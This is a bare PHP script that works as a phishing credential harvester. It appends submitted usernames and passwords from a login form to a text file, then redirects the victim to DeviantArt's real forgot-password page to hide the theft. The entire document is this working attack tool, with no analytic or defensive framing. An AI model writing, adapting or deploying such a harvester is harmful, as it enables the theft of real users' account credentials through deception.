<?php
file_put_contents("usernames.txt", "Username: " . $_POST['session_key'] . " | Password: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: https://www.deviantart.com/users/forgot/');
exit();
?>
